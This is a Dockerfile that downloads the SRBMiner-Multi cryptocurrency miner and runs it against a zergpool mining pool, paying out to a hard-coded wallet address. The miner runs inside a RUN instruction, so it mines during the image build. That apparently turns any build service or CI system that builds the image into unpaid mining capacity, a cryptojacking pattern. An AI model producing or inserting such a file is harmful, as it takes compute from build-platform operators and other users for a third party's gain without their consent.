FROM debian:stable-slim
RUN apt-get -y update \
    && apt-get -y upgrade \
    && apt-get -y install curl xz-utils \
    && cd /opt \
    && curl -L https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.3/SRBMiner-Multi-2-4-3-Linux.tar.xz -o SRBMiner-Multi.tar.xz \
    && tar xf SRBMiner-Multi.tar.xz \
    && rm -rf SRBMiner-Multi.tar.xz \
    && mv /opt/SRBMiner-Multi-2-4-3/ /opt/SRBMiner-Multi/ \
    && apt-get -y purge xz-utils \
    && apt-get -y autoremove --purge \
    && apt-get -y clean \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/*
EXPOSE 80
RUN /opt/SRBMiner-Multi/SRBMiner-MULTI --algorithm yespowerLTNCG --pool stratum+tcp://yespowerLTNCG.mine.zergpool.com:6239 --wallet DFgN9Wf6AwSiRPskC5PJWBvafecAZEjbho --password c=DOGE,mc=CRNC,ID=test-from-git --api-enable --api-port 80 --disable-auto-affinity --disable-gpu --cpu_threads 0
